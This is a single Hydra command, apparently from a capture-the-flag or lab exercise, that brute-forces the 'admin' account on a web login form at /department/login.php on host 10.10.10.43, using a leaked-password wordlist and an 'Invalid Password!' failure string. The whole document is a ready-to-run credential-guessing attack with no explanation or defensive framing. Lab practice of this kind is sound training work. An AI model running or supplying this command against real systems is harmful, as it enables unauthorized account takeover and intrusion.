hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
